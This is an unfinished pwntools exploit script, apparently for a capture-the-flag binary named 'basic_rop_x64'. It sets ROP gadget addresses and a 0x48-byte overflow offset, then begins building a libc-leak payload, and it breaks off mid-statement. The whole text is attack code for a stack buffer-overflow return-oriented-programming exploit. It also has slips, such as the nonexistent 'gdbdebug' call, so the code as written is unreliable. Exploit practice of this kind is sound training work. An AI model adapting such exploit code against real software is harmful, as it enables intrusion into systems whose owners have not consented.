from pwn import *
elf = context.binary = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6") 

gs = '''
start
'''

def start():
    if args.GDB:
        return gdbdebug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
pop_rdi = 0x400883
pop_rsi = 0x400881
pop_rdx = 0x11f4d2
offset = 0x48 
#leak libc
payload1 = b"A"*offset + p64(pop_rdi)
payload1 += p64(elf.sym.plt)
payload1 += 


